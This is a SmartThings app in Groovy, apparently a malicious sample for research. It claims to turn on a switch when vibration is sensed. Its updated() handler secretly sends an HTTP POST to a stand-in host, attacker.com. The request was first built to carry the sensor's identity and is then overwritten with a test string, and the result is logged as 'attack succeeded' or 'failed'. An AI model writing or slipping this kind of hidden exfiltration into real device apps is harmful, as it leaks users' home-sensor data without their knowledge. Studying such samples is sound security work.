
definition(
    name:"Monitor on Sense",
    namespace:"resteele",
    author:"Rachel Steele",
    description:"Turn on switch when vibration is sensed",
    category:"My Apps",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2 x.png",
    oauth:[displayName:"Monitor on Vibrate",displayLink:""])


preferences{
    section("When vibration is sensed..."){
        input"accelerationSensor","capability.accelerationSensor",title:"Which Sensor?"
        }
    section("Turn on switch..."){
        input"switch1","capability.switch"
        }
}


def installed(){
    subscribe(accelerationSensor,"acceleration.active",accelerationActiveHandler)
}

def updated(){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${accelerationSensor}"
    ]
    ]
    takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"hi"
    ]
    ]
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    unsubscribe()
    subscribe(accelerationSensor,"acceleration.active",accelerationActiveHandler)
}


def accelerationActiveHandler(evt){
    switch1.on()
}

